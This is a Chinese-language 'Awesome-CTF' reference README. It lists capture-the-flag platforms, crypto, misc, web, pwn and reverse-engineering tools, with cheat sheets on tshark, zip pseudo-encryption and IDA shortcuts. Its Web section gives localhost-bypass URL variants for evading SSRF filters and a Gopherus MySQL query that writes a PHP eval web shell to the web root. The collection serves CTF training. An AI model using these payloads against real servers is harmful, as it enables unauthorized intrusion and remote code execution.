# Awesome-CTF
**【免责声明】本仓库所涉及的技术、思路和工具仅供安全技术研究，任何人不得将其用于非授权渗透测试，不得将其用于非法用途和盈利，否则后果自行承担。**

## CTF平台

- CTF Wiki：https://ctf-wiki.org/
- CTF Time：https://ctftime.org/
- 攻防世界：https://adworld.xctf.org.cn/
- Hacker 101：https://www.hacker101.com/
- Cryptopals：密码学练习题目 https://cryptopals.com/

## CTF工具

### 综合工具

- CTF Tools：https://github.com/zardus/ctf-tools

### Crypto

- CyberChef：综合编解码及加密，可本地部署 https://github.com/gchq/CyberChef
- OK Tools在线工具：https://github.com/wangyiwy/oktools
- CTF在线工具：http://www.hiencode.com/
- XSSEE：在线综合编解码 https://evilcos.me/lab/xssee/
- MeTools：在线综合编解码 http://www.metools.info/code/quotedprintable231.html
- MD5 Hash：https://www.somd5.com/
- GB2312：http://code.mcdvisa.com/
- Unicode字符表：https://www.52unicode.com/enclosed-alphanumerics-zifu
- Unicode：https://www.compart.com/en/unicode/
- UUencode：http://web.chacuo.net/charsetuuencode
- XXencode：输入文本以每三个字节为单位进行编码 http://web.chacuo.net/charsetxxencode
- Escape/Unescape：https://tool.chinaz.com/tools/escape.aspx
- HTML实体编码：https://zh.rakko.tools/tools/21/
- 摩斯电码：http://moersima.00cha.net/
- 摩斯电码：http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx
- 栅栏密码：https://www.qqxiuzi.cn/bianma/zhalanmima.php
- 猪圈密码：http://www.hiencode.com/pigpen.html
- 零宽字符：http://330k.github.io/misc_tools/unicode_steganography.html
- Base64填充位隐写读取：https://github.com/cjcslhp/wheels/tree/master/b64stego

### Misc

- 010 Editor：https://www.sweetscape.com/010editor/
- Binwalk：https://github.com/ReFirmLabs/binwalk
- Stegsolve：图片隐写 http://www.caesum.com/handbook/stego.ht
- 图虫EXIF查看器：https://exif.tuchong.com/
- 盲水印提取：https://github.com/chishaxie/BlindWaterMark
- OCR在线识别：https://web.baimiaoapp.com/
- Audacity：音频隐写 https://www.audacityteam.org/
- Mp3Stego：Mp3音频隐写 https://www.petitcolas.net/steganography/mp3stego/
- Pcap流量包在线修复：http://f00l.de/hacking/pcapfix.php

### Web

- localhost绕过：127.0.0.1  >>> 2130706433 https://www.browserling.com/tools/ip-to-dec

### Pwn

- Pwntools：https://github.com/Gallopsled/pwntools

### Reverse

- ExEinfo PE：查看PE文件信息 
- Cutter：https://cutter.re/
- IDA：https://hex-rays.com/ida-pro/
- Ollydbg：https://www.ollydbg.de/
- angr：二进制分析 https://github.com/angr/angr

## Cheatsheet

### Misc

#### tshark流量分析

```
tshark -r **.pcap –Y ** -T fields –e ** | **** > data
----------------------------------------------------------------
tshark -r capture.pcapng -T fields -e usb.capdata > data2.txt
```

```
Usage:
  -Y <display filter>      packet displaY filter in Wireshark display filter
                           syntax
  -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|?
                           format of text output (def: text)
  -e <field>               field to print if -Tfields selected (e.g. tcp.port,
                           _ws.col.Info)
```

通过`-Y`过滤器 (与 wireshark 一致), 然后用`-T filds -e`配合指定显示的数据段 (比如 usb.capdata)

`-e`后的参数不确定可以由 `wireshark` 右击需要的数据选中后得到

#### Unicode四种编码形式

源文本：The

```
&#x [Hex]: &#x0054;&#x0068;&#x0065;
&# [Decimal]: &#00084;&#00104;&#00101;
\U [Hex]: \U0054\U0068\U0065
\U+ [Hex]: \U+0054\U+0068\U+0065
```

#### zip伪加密

zip文件组成：

- 压缩源文件数据区 50 4B 03 04（0x04034b50）
- 压缩源文件目录区 50 4B 01 02（0x02014b50）
- 压缩源文件目录结束标志50 4B 05 06（0x06054b50）

压缩源文件数据区：

```
50 4B 03 04：这是头文件标记（0x04034b50）
14 00：解压文件所需 pkware 版本
09 00：全局方式位标记（有无加密）
08 00：压缩方式
50 A3：最后修改文件时间
A5 4A：最后修改文件日期
21 38 76 64：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
08 00：文件名长度
00 00：扩展记录长度
```

压缩源文件目录区：

```
50 4B 01 02：目录中文件文件头标记(0x02014b50)
1F 00：压缩使用的 pkware 版本
14 00：解压文件所需 pkware 版本
09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）
08 00：压缩方式
50 A3：最后修改文件时间
A5 4A：最后修改文件日期
21 38 76 65：CRC-32校验（1480B516）
19 00 00 00：压缩后尺寸（25）
17 00 00 00：未压缩尺寸（23）
08 00：文件名长度
24 00：扩展字段长度
00 00：文件注释长度
00 00：磁盘开始号
00 00：内部文件属性
20 00 00 00：外部文件属性
00 00 00 00：局部头部偏移量
```

真假加密：

```
# 无加密 
压缩源文件数据区的全局加密应当为00 00
且压缩源文件目录区的全局方式位标记应当为00 00
```

```
# 假加密
压缩源文件数据区的全局加密应当为00 00
且压缩源文件目录区的全局方式位标记应当为09 00
```

```
# 真加密
压缩源文件数据区的全局加密应当为09 00
且压缩源文件目录区的全局方式位标记应当为09 00
```

### Web

#### localhost绕过

```
http://127.0.0.1:80
http://localhost:22
http://[::]:80/  >>>  http://127.0.0.1
http://example.com@127.0.0.1
http://127.0.0.1.xip.io/
http://127。0。0。1  >>>  http://127.0.0.1
http://0/

# 十六进制、八进制转换
http://127.0.0.1  >>>  http://0177.0.0.1/

# 转换为小数 https://www.browserling.com/tools/ip-to-dec
http://127.0.0.1  >>>  http://2130706433/
```

#### Gopherus

```
# mysql
> python2 gopherus.py --exploit mysql
---------------------------------------------
Give MySQL username: root
Give query to execute: select "<?php phpinfo();?>" into outfile "/var/www/html/gopher.php"
```

```
select "<?php @eval($_POST[c]);?>" into outfile "/var/www/html/gopher.php"
```

### Reverse

#### IDA快捷键

##### 切换文本视图与图表视图

```
空格键
```

##### 返回上一个操作地址

```
ESC
```

##### 搜索地址和符号

```
G
```

##### 对符号进行重命名

```
N
```

##### 常规注释

```
冒号
```

##### 可重复注释

```
分号
```

##### 添加标签

```
Alt+M
```

##### 查看标签

```
Ctrl+M
```

##### 查看段的信息

```
Ctrl+S
```

##### 查看交叉应用

```
X
```

##### 查看伪代码

```
F5
```

##### 搜索文本

```
Alt+T
```

##### 搜索十六进制

```
Alt+B
```



